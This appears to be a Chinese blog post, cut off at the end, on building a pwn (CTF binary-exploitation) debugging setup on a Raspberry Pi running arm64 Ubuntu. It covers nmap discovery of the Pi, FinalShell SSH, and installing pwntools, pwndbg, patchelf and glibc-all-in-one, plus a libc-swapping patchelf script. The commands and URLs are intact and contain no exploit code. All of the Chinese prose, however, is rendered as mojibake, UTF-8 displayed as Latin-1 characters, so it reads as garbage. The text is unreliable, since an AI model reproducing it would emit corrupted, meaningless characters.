title="ubuntuç¯å¢ƒçš„çƒ§å½•å’Œå¯åŠ¨"></a>ubuntuç¯å¢ƒçš„çƒ§å½•å’Œå¯åŠ¨</h2><p>â€‹    è¿™é‡Œæä¾›ä¸€ä¸ªé“¾æ¥æŒ‡å¯¼æˆ‘ä»¬çš„å®‰è£…ubuntué•œåƒ(<a href="https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#1-overview">https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#1-overview</a>),</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717084431014.png" alt="çƒ§å½•å·¥å…·"></p><p>â€‹    è¿™é‡Œæœ‰ä¸‰ä¸ªä¸åŒçš„é€‰é¡¹æ ¹æ®ä½ ä¸»æœºçš„æ“ä½œç³»ç»Ÿé€‰æ‹©åˆé€‚çš„çƒ§å½•ã€‚å…·ä½“çš„çƒ§å½•æ–¹æ³•å¯ä»¥å‚è€ƒä¸Šé¢çš„é“¾æ¥ï¼Œå†…å®¹å¾ˆè¯¦å®ã€‚ä¸€å®šè¦ä»”ç»†çœ‹ä¸Šé¢çš„å®˜æ–¹æ–‡æ¡£ï¼Œä¸ç„¶å¯èƒ½ä¼šå‡ºç°ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ã€‚</p><p>â€‹    å…³äºæ ‘è“æ´¾çš„wifié“¾æ¥è¿™é‡Œæœ‰ä¸ªå¤§å‘ï¼Œå®˜æ–¹æ–‡æ¡£æ˜¯è¿™æ ·è¯´çš„ï¼š</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717090334507.png" alt="å®˜æ–¹æ–‡æ¡£æˆªå›¾"></p><p>â€‹    </p><p>ä½†æ˜¯å®é™…ä¸Šè¿™é‡Œå¦‚æœæ²¡æœ‰æ˜¾ç¤ºå±å’Œé”®ç›˜çš„è¯æ— æ³•é‡å¯è¿›è¡Œé‡å¯ï¼Œä¹Ÿå°±<strong>æ— æ³•è¿æ¥</strong>åˆ°wifeï¼Œè€Œä¸”ç”±äºæŸäº›å¥‡æ€ªçš„åŸå› è¿™ä¸ª<strong>é…ç½®æ–‡ä»¶</strong>è¿˜éœ€è¦åœ¨å¼€æœºåå†æ¬¡ç¼–å†™ä»¥ä¿è¯æ ¼å¼ï¼Œæ‰€ä»¥ä¹‹å‰å‡†å¤‡å·¥ä½œæ‰è¯´æ˜éœ€è¦æ˜¾ç¤ºå±å’Œé”®ç›˜ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥å†å°è¯•å°è¯•ï¼Œè¯´ä¸å®šå°±æˆåŠŸäº†ï¼Œæœ‰æ—¶å€™æŒºç„å­¦çš„ã€‚</p><p>è¿™é‡Œæˆ‘åŸºæœ¬èŠ±äº†ä¸€å¤©æ—¶é—´ï¼Œå¤§å¤šæ•°æ—¶é—´åœ¨æ— æ„ä¹‰çš„ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå› ä¸ºæ²¡æœ‰æ˜¾ç¤ºå±è½¬æ¢å™¨ï¼Œä»¥ä¸ºæ˜¯é…ç½®æ–‡ä»¶æ ¼å¼é—®é¢˜ï¼Œç»“æœèŠ±äº†ä¸€å¤©æ—¶é—´éƒ½æ²¡è§£å†³ï¼Œç­‰è½¬æ¢å™¨åˆ°äº†ä½¿ç”¨æ˜¾ç¤ºå™¨åŸºæœ¬ä¸€ä¼šå°±è§£å†³äº†ï¼Œåªè¦ä½ çš„é…ç½®æ–‡ä»¶æ ¼å¼ä¿è¯ï¼Œå¼€æœºåè®¾ç½®å¯†ç ï¼Œç„¶å<strong>é‡å¯</strong>ï¼Œé‡å¯ä»¥å<strong>ç­‰å¾…ä¸€ä¼š</strong>åŸºæœ¬å°±å¯ä»¥è¿æ¥åˆ°wifiäº†ï¼Œå¦‚æœæ— æ³•é“¾æ¥ï¼Œæ£€æŸ¥ä¸€ä¸‹é…ç½®æ–‡ä»¶</p><p><strong>æ³¨æ„ï¼šé…ç½®æ–‡ä»¶ä¸­å†’å·åé¢ä¸€å®šæœ‰æ¢è¡Œæˆ–è€…ç©ºæ ¼ï¼Œè€Œä¸”è¿˜è¦æ³¨æ„å¯¹é½</strong>ã€‚</p><h1 id="å¯»æ‰¾æ ‘è“æ´¾IPä»¥åŠsshè¿æ¥"><a href="#å¯»æ‰¾æ ‘è“æ´¾IPä»¥åŠsshè¿æ¥" class="headerlink" title="å¯»æ‰¾æ ‘è“æ´¾IPä»¥åŠsshè¿æ¥"></a>å¯»æ‰¾æ ‘è“æ´¾IPä»¥åŠsshè¿æ¥</h1><h2 id="å¯»æ‰¾æ ‘è“æ´¾ipåœ°å€"><a href="#å¯»æ‰¾æ ‘è“æ´¾ipåœ°å€" class="headerlink" title="å¯»æ‰¾æ ‘è“æ´¾ipåœ°å€"></a>å¯»æ‰¾æ ‘è“æ´¾ipåœ°å€</h2><p>å®˜æ–¹æ–‡æ¡£ç»™äº†ä¸€ç§å¯»æ‰¾æ ‘è“æ´¾çš„æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘å°è¯•è¿‡åæ„Ÿè§‰å¹¶ä¸æ˜¯å¾ˆæœ‰ç”¨ï¼Œåæ¥å‘ç°å…¶macåœ°å€å’Œå®˜æ–¹çš„æœ‰å‡ºå…¥ï¼Œå‡å¦‚ä½ ä½¿ç”¨çš„æ˜¯æ‰‹æœºçƒ­ç‚¹ï¼Œå¹¶ä¸”ä½ çš„æ‰‹æœºçƒ­ç‚¹å¯ä»¥æ˜¾ç¤ºipåœ°å€æœ€å¥½ä¸è¿‡äº†ï¼Œå¦‚æœæ˜¯å…¶ä»–æƒ…å†µçš„è¯è¿™é‡Œæˆ‘æ¨èä½¿ç”¨<strong>Nmap</strong>æ¥è¿›è¡Œæ‰«æã€‚</p><p>è¿™é‡Œè‚¯å®šå…ˆè¦ä¿è¯ä½ å’Œæ ‘è“æ´¾åœ¨åŒä¸€ä¸ªwifiä¸‹ï¼Œç„¶åæ£€æŸ¥ä½ æœ¬åœ°çš„ipåœ°å€winæ“ä½œç³»ç»Ÿä¸‹ä½¿ç”¨<code>ipconfig</code>æŸ¥çœ‹æœ¬åœ°IPåœ°å€</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717093955362.png" alt="æŸ¥çœ‹æœ¬åœ°ip"></p><p>å¯ä»¥çœ‹åˆ°<strong>ip</strong>åœ°å€æ˜¯192.168.43.29,<strong>å­ç½‘æ©ç </strong>æ˜¯255.255.255.0ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦æ£€æŸ¥192.168.43.1/24è¿™ä¸ªç½‘ç»œä¸‹çš„å­˜æ´»çš„ipæœ‰å“ªäº›</p><p>ä½¿ç”¨<code>nmap -sP 192.168.43.1/24</code>å‘½ä»¤æˆ‘ä»¬å¯ä»¥çœ‹åˆ°</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717094520150.png" alt="å¯»æ‰¾æ ‘è“æ´¾"></p><p>æœ‰ä¸¤å°å­˜æ´»ä¸»æœºï¼Œä¸€å°æ˜¯æˆ‘ä»¬ä¸»æœºï¼Œé‚£ä¹ˆå¦ä¸€å°å°±æ˜¯æˆ‘ä»¬çš„æ ‘è“æ´¾äº†ï¼Œå½“ç„¶å¯ä»¥çœ‹åˆ°å…¶macåœ°å€åé¢ä¹Ÿå‘Šè¯‰æˆ‘ä»¬è¿™å°ä¸»æœºæ˜¯æ ‘è“æ´¾ã€‚è¿™æ ·æˆ‘ä»¬å°±æ‰¾åˆ°æˆ‘ä»¬æ ‘è“æ´¾çš„ipæ˜¯192.168.43.29ã€‚</p><h2 id="ä½¿ç”¨FInallshellè¿›è¡Œè¿æ¥"><a href="#ä½¿ç”¨FInallshellè¿›è¡Œè¿æ¥" class="headerlink" title="ä½¿ç”¨FInallshellè¿›è¡Œè¿æ¥"></a>ä½¿ç”¨FInallshellè¿›è¡Œè¿æ¥</h2><p>æ¥ä¸‹æ¥æˆ‘æ¨èä½¿ç”¨Finalshellæ¥å»ºç«‹è¿æ¥ã€‚è¿™ä¸ªå·¥å…·è¦æ¯”xshellå¥½ç”¨å¥½å¤šäº†</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095624945.png" alt="Finalshell"></p><p>é¦–å…ˆç‚¹å‡»è¿™é‡Œæ‰“å¼€è¿æ¥ç®¡ç†å™¨</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095715919.png" alt="è¿æ¥ç®¡ç†å™¨"></p><p>å†ç‚¹å‡»è¿™é‡Œæ–°å»ºsshè¿æ¥</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095821208.png" alt="æ–°å»ºsshè¿æ¥"></p><p>ä»¥è¿™æ ·çš„æ ¼å¼å¡«å†™å³å¯ã€‚</p><p>ç„¶åå°±å¯ä»¥å¼€å§‹é“¾æ¥æˆ‘ä»¬çš„æ ‘è“æ´¾å•¦ï¼Œå½“ç„¶ä½ è‚¯å®šä¼šè§‰å¾—è¿™ä¸ªçª—å£ä¸æ˜¯å¾ˆå¥½çœ‹ï¼ŒèƒŒæ™¯æŒºç¢çœ¼çš„ï¼Œè¿™é‡Œå…¶å®å¯ä»¥<strong>å…³é—­èƒŒæ™¯</strong>ï¼Œé¼ æ ‡å³å‡»å¯ä»¥çœ‹åˆ°ä¸‹é¢æœ‰è®¾ç½®èƒŒæ™¯å›¾ç‰‡</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717100427076.png" alt="è®¾ç½®èƒŒæ™¯å›¾ç‰‡"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717100719414.png" alt="é…ç½®é…è‰²å­—ä½“ä»¥åŠå…³é—­èƒŒæ™¯"></p><p>æŠŠå¯ç”¨å›¾ç‰‡çš„âˆšæ‰“æ‰å°±å¥½äº†ï¼Œæ­¤æ—¶ä½ è¿˜å‘ç°å–æ¶ˆæ‰èƒŒæ™¯æ€ä¹ˆè¿˜æ˜¯è“è‰²çš„ï¼Œåˆ«ç€æ€¥ï¼Œçœ‹çœ‹è¿™é‡Œè¿˜è¦é…è‰²æ ï¼Œä½ æœ‰å¾ˆå¤šé’Ÿé…è‰²å¯ä»¥é€‰æ‹©ï¼Œæœ€ä¸‹é¢æœ‰å­—ä½“å¤§å°é€‰æ‹©ï¼Œè¿™æ ·å°±å¯ä»¥é€‰æ‹©åˆé€‚çš„å­—ä½“å¤§å°å’Œé…è‰²å•¦ï¼ˆæ¯•ç«Ÿ<em>çš®è‚¤å’Œåéª‘çš„æ­é…æ‰æ˜¯è·èƒœçš„å…³é”®</em>ï¼Œè¿™æ ·å°±å¯ä»¥èˆ’èˆ’æœæœçš„è¿›è¡Œè°ƒè¯•å•¦ã€‚</p><h1 id="pwnè°ƒè¯•ç¯å¢ƒæ­å»º"><a href="#pwnè°ƒè¯•ç¯å¢ƒæ­å»º" class="headerlink" title="pwnè°ƒè¯•ç¯å¢ƒæ­å»º"></a>pwnè°ƒè¯•ç¯å¢ƒæ­å»º</h1><p>æ¥ä¸‹æ¥å°±å¯ä»¥æ­£å¼å¼€å§‹æˆ‘ä»¬çš„ç¯å¢ƒæ­å»ºäº†ï¼Œè¿™é‡Œæ‰æ˜¯ç—›è‹¦çš„å¼€å§‹ï¼Œåœ¨é…ç½®ç¯å¢ƒæœŸé—´é‡åˆ°äº†æ•°ä¸æ¸…çš„é—®é¢˜ï¼Œè¿™ä¸€éƒ¨åˆ†ä»…ä¾›å‚è€ƒï¼Œå®é™…å®‰è£…çš„æ—¶å€™è¿˜æ˜¯è¦è®°å¾—å¤šæœç´¢ï¼Œæ¯•ç«Ÿè¿™é‡Œæ¯ä¸ªäººé‡åˆ°çš„æƒ…å†µéƒ½æœ‰å¯èƒ½ä¸åŒã€‚</p><h2 id="python2çš„pipå®‰è£…å’Œpwntoolså®‰è£…"><a href="#python2çš„pipå®‰è£…å’Œpwntoolså®‰è£…" class="headerlink" title="python2çš„pipå®‰è£…å’Œpwntoolså®‰è£…"></a>python2çš„pipå®‰è£…å’Œpwntoolså®‰è£…</h2><p>æˆ‘ä»¬å…ˆæ¥è§£å†³æœ€å›°éš¾çš„ï¼Œä¹Ÿå°±æ˜¯python2çš„pwntoolså®‰è£…ï¼Œä¹‹å‰ä¸€ç›´æ˜¯ç›´æ¥ä½¿ç”¨pipè¿æ¥å¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯è¿™æ¬¡å´æœ‰äº›é—®é¢˜ï¼Œä¸ç®¡æ€ä¹ˆè¯´å…ˆå®‰è£…python2</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install python</span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å°†pythonçš„é»˜è®¤ä¸ºpython2äº†ï¼Œå¦‚ä¸‹å›¾</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717105912959.png" alt="pythoné»˜è®¤pthon2"></p><p>æ¥ä¸‹æ¥æ˜¯pipçš„å®‰è£…ï¼Œç°åœ¨å·²ç»æ— æ³•æ­£å¸¸å®‰è£…python2çš„pipäº†ï¼Œåªèƒ½é‡‡å–ä¸€äº›å…¶ä»–çš„æ‰‹æ³•,å…ˆå®‰è£…setup-toolsï¼Œè¿™é‡Œéœ€è¦å…ˆå®‰è£…æ‰“å¼€zipæ–‡ä»¶çš„è½¯ä»¶</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install unzip</span><br><span class="line">wget https://pypi.python.org/packages/45/29/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-36.6.0.zip<span class="comment">#md5=74663b15117d9a2cc5295d76011e6fd1</span></span><br><span class="line">unzip setuptools-36.6.0.zip </span><br><span class="line"><span class="built_in">cd</span> setuptools-36.6.0</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>å†å®‰è£…pip</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">sudo python2 get-pip.py</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹pipç‰ˆæœ¬<code>pip --version </code></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717113029446.png" alt="æ£€æŸ¥pipç‰ˆæœ¬"></p><p>è¯´æ˜pipå®‰è£…å®Œæˆ</p><p>æ¥ä¸‹æ¥å®‰è£…pwntools</p><p>å®‰è£…pwntoolsä¹‹å‰è¿˜éœ€è¦ä¸€äº›å‡†å¤‡å·¥ä½œ,</p><p>å®‰è£…gcc</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc</span><br></pre></td></tr></table></figure><p>å®‰è£…capstone</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install make </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/aquynh/capstone</span><br><span class="line"><span class="built_in">cd</span> capstone</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>å®‰è£…pwntools</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Gallopsled/pwntools</span><br><span class="line"><span class="built_in">cd</span> pwntools</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>éªŒè¯ä¸€ä¸‹pwntoolså¯ç”¨</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717113956081.png" alt="éªŒè¯pwntools"></p><p>å¦‚æœä¸å‡ºæ„å¤–ï¼Œè¿™é‡Œpwntoolså°±å®‰è£…å¥½äº†ï¼Œ<strong>ä¸è¦å°è¯•</strong>ç”¨pipå®‰è£…ï¼ŒåŸºæœ¬ä¸å¯èƒ½å®‰è£…æˆåŠŸçš„ï¼Œå¦‚æœæœ‰å…¶ä»–æƒ…å†µå°±å¤šæœç´¢å§ï¼Œæˆ–è€…è¯„è®ºåŒºé—®æˆ‘ï¼Œå¦‚æœæˆ‘çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œä¼šç»™ä½ å›å¤çš„ã€‚è¿™é‡Œpwntoolsç®—æ˜¯å®‰è£…å®Œæˆäº†å¦‚æœæœ‰é—®é¢˜æˆ‘è¿˜æ˜¯æ¨èè£…python3çš„pwntoolså§,å¯èƒ½å“ªä¸€å¤©python2å°±ä¸èƒ½ç”¨äº†,ä¸æ˜¯å—,æˆ‘åœ¨è£…32ä½armçš„ubuntuç¯å¢ƒçš„æ—¶å€™å‘ç°æ— è®ºå¦‚ä½•éƒ½æä¸å®š,æˆ‘å·²ç»ç»æœ›äº†,è¿˜æ˜¯é€‚åº”python3å§.</p><p>python3å®‰è£…pwntoolsçš„è¯å°±ç®€å•å¤šäº†</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -y</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">pip3 install --upgrade pwntools</span><br></pre></td></tr></table></figure><h2 id="pwndbgå®‰è£…"><a href="#pwndbgå®‰è£…" class="headerlink" title="pwndbgå®‰è£…"></a>pwndbgå®‰è£…</h2><p>ä½¿ç”¨ä¸‹é¢å‘½ä»¤æ¥å®‰è£…pwntools</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717121038336.png" alt="éªŒè¯pwndbgå®‰è£…"></p><p>è¿™æ ·å°±æ˜¯å®‰è£…æˆåŠŸå•¦</p><h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><p>patchelfæ˜¯æˆ‘ä»¬ç”¨æ¥æ”¹å†™æ–‡ä»¶ldå’Œlibcçš„è¿™é‡Œæ¨è<em>patchelf_0.12</em></p><p><a href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></p><p>githubåœ°å€åœ¨è¿™é‡Œé‡Œé¢æœ‰è¯¦ç»†çš„æ•™å­¦ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°å•¦</p><p>æŒ‰ç…§å®˜æ–¹æ•™ç¨‹æ¥å°±å¥½äº†</p><h2 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc all in one"></a>glibc all in one</h2><p>è¿™é‡Œè¿˜éœ€è¦glibc all in oneï¼Œè™½ç„¶glibc all in oneçš„ä¸‹çš„åº“æ˜¯x86ä¸‹çš„ï¼Œä½†æ˜¯è¿™ä¸ªå¯ä»¥å¸®åŠ©æˆ‘ä»¬å¾ˆå¥½çš„ç®¡ç†gliibc</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸Šé¢è¯­å¥è¿›è¡Œä¸‹è½½</p><p>ç„¶åéšä¾¿ä¸‹è½½ä¸€ä¸ªlibcï¼Œå½¢æˆæ–‡ä»¶å¤¹</p><p>ä¸‹è½½å¥½åéœ€è¦å®‰è£…ä¸€ä¸ªåº“,å¹¶å½¢æˆæ–‡ä»¶å¤¹</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chmod 777 -R glibc-all-in-one/</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br><span class="line">sudo pip install requests </span><br><span class="line">./update_list</span><br><span class="line">./download 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure><p>è¿™æ ·åŸºæœ¬å°±å®Œæˆäº†</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717131220453.png" alt="å®Œæˆåçš„æ•ˆæœ"></p><p>ç±»ä¼¼ä¸Šå›¾ï¼Œç„¶ååˆ é™¤debså’Œlibcé‡Œçš„æ–‡ä»¶ï¼Œè¿™äº›éƒ½æ˜¯x86ä¸‹çš„ï¼Œç”¨ä¸åˆ°çš„.</p><h1 id="å¦‚ä½•æ›´æ”¹libcå¹¶å®Œæˆè°ƒè¯•"><a href="#å¦‚ä½•æ›´æ”¹libcå¹¶å®Œæˆè°ƒè¯•" class="headerlink" title="å¦‚ä½•æ›´æ”¹libcå¹¶å®Œæˆè°ƒè¯•"></a>å¦‚ä½•æ›´æ”¹libcå¹¶å®Œæˆè°ƒè¯•</h1><h2 id="ä¸‹è½½libc"><a href="#ä¸‹è½½libc" class="headerlink" title="ä¸‹è½½libc"></a>ä¸‹è½½libc</h2><p>å½“ä»€ä¹ˆçš„å·¥ä½œéƒ½å®Œæˆäº†æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹è°ƒè¯•å•¦ï¼Œæˆ‘ä»¬ä»¥ä¸€é“é¢˜ç›®ä¸ºä¾‹</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717130021816.png" alt="ä¾‹å­"></p><p>ä¸€èˆ¬é™„ä»¶ä¼šç»™æˆ‘ä»¬å››ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦çš„åªè¦libc-2.31.soå’Œé¢˜ç›®æ–‡ä»¶</p><p>å…ˆå°†libcæ”¾å…¥æˆ‘ä»¬çš„æ ‘è“æ´¾ç³»ç»Ÿä¸­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x libc-2.31.so</span><br><span class="line">./libc-2.31.so</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717132511485.png" alt="æŸ¥çœ‹libcç‰ˆæœ¬"></p><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½æ‰¾åˆ°å¯¹åº”çš„libcç‰ˆæœ¬</p><p>åœ¨è¿™ä¸ªç½‘ç«™ä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸åŒæ¶æ„çš„ä¸åŒç‰ˆæœ¬libcï¼Œåªè¦<strong>æ›´æ”¹æœ€åçš„è·¯å¾„</strong>å³å¯,éœ€è¦ä»€ä¹ˆç‰ˆæœ¬æœç´¢ä»€ä¹ˆ</p><p><a href="https://launchpad.net/ubuntu/+source/glibc/2.31-0ubuntu9.2">https://launchpad.net/ubuntu/+source/glibc/2.31-0ubuntu9.2</a></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717132941579.png" alt="å¯»æ‰¾libc"></p><p>ç‚¹å‡»ä¸Šå›¾çš„arm64</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717133112289.png" alt="éœ€è¦ä¸‹è½½çš„åŒ…">ä¸‹è½½å¦‚å›¾æ‰€ç¤ºçš„æ–‡ä»¶(å…¶ä»–ç‰ˆæœ¬ä¹Ÿæ˜¯è¿™æ ·æ ¼å¼)åˆ°è¿™é‡Œ*/home/<strong>yourneme</strong>/glibc-all-in-one/debs<em>ï¼Œæ³¨æ„<strong>yourname</strong>æ˜¯ä½ ä¸»æœºçš„åå­—ï¼Œå¯ä»¥ç›´æ¥<strong>æ‹–åŠ¨</strong>åˆ°Finallshellæ˜¾ç¤ºçš„è¯¥æ–‡ä»¶å¤¹ä¸‹ï¼Œæˆ–è€…*<em>å¤åˆ¶</em></em></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717133330375.png" alt="ä¸‹è½½è·¯å¾„"></p><p>è·¯å¾„å¦‚å›¾</p><p>åœ¨glibcç›®å½•ä¸‹è¿è¡Œä¸‹é¢å‘½ä»¤ï¼ˆ<strong>æ³¨æ„æ›´æ”¹è·¯å¾„ï¼Œå°†ubuntuæ¢æˆä½ çš„åå­—</strong>ï¼‰</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./extract /home/ubuntu/glibc-all-in-one/debs/libc6_2.31-0ubuntu9.2_arm64.deb /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64</span><br><span class="line">./extract /home/ubuntu/glibc-all-in-one/debs/libc6-dbg_2.31-0ubuntu9.2_arm64.deb /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64/.debug</span><br></pre></td></tr></table></figure><p>è¿™æ ·libcå°±éƒ¨ç½²å¥½äº†ã€‚</p><h2 id="ä½¿ç”¨patchelfæ”¹å˜ldå’Œlibc"><a href="#ä½¿ç”¨patchelfæ”¹å˜ldå’Œlibc" class="headerlink" title="ä½¿ç”¨patchelfæ”¹å˜ldå’Œlibc"></a>ä½¿ç”¨patchelfæ”¹å˜ldå’Œlibc</h2><p>è¿™é‡Œæä¾›ä¸€ä¸ªè„šæœ¬æ¥å¸®åŠ©å¸ˆå‚…ä»¬æ›´æ”¹libcï¼Œè„šæœ¬æ¥æºï¼š<em><a href="https://bbs.pediy.com/thread-254868.htm">https://bbs.pediy.com/thread-254868.htm</a></em></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> -x</span><br><span class="line">libc_path=<span class="variable">$1</span></span><br><span class="line">elf_path=<span class="variable">$2</span></span><br><span class="line">patchelf_bin_path=<span class="string">&quot;/home/ubuntu/patchelf/src/patchelf&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$&#123;libc_path&#125;</span>/ld-[2].[0-9][0-9].so ]; <span class="keyword">then</span></span><br><span class="line">    <span class="variable">$patchelf_bin_path</span> --set-interpreter <span class="variable">$libc_path</span>/ld-[2].[0-9][0-9].so <span class="variable">$elf_path</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$libc_path</span>/libc-[2].[0-9][0-9].so ]; <span class="keyword">then</span></span><br><span class="line">    <span class="variable">$patchelf_bin_path</span> --replace-needed libc.so.6 <span class="variable">$libc_path</span>/libc-[2].[0-9][0-9].so <span class="variable">$elf_path</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">set</span> +x</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„*patchelf_bin_path=â€/home/ubuntu/patchelf/src/patchelfâ€*è·¯å¾„éœ€è¦å¸ˆå‚…ä»¬è‡ªè¡Œæ›´æ”¹ä¸ºè‡ªå·±patchelfçš„è·¯å¾„ï¼Œ<strong>æ³¨æ„ä¸æ˜¯æ–‡ä»¶å¤¹æ˜¯æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶</strong>ã€‚</p><p>å°†è¯¥è„šæœ¬å‘½åä¸ºchlibc.sh</p><p>æ·»åŠ å¯æ‰§è¡Œæƒé™</p><p>ä½¿ç”¨è¯¥è„šæœ¬</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./chlibc.sh /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64 channel </span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªè·¯å¾„æ˜¯ä½ <strong>libcæ–‡ä»¶å¤¹</strong>çš„ä½ç½®ï¼Œæœ€åæ˜¯ä½ æ–‡ä»¶çš„ä½ç½®ï¼Œè¿™æ ·å°±å®ç°äº†å¯¹æ–‡ä»¶çš„patchï¼Œæ”¹å˜äº†æ–‡ä»¶çš„ldå’Œlibc</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134856774.png" alt="patch"></p><p>ä½¿ç”¨lddéªŒè¯ä¸€ä¸‹</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134809674.png" alt="éªŒè¯"></p><p>å¯ä»¥å‘ç°æ²¡æœ‰ä»»ä½•é—®é¢˜</p><h2 id="è°ƒè¯•éªŒè¯"><a href="#è°ƒè¯•éªŒè¯" class="headerlink" title="è°ƒè¯•éªŒè¯"></a>è°ƒè¯•éªŒè¯</h2><p>æˆ‘ä»¬ç”¨gdbè°ƒè¯•ä¸€ä¸‹çœ‹çœ‹</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134953976.png" alt="heapå¯è¡Œ"></p><p>è¿™æ ·å®Œæˆè°ƒè¯•ï¼Œæ˜¾ç¤ºheap</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717135015786.png" alt="binså¯è¡Œ"></p><p>ä¹Ÿå¯ä»¥æ­£å¸¸æ˜¾ç¤ºbinsï¼Œè¿™æ ·å°±å®Œæˆäº†æˆ‘ä»¬çš„ç¯å¢ƒæ­å»ºäº†ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" 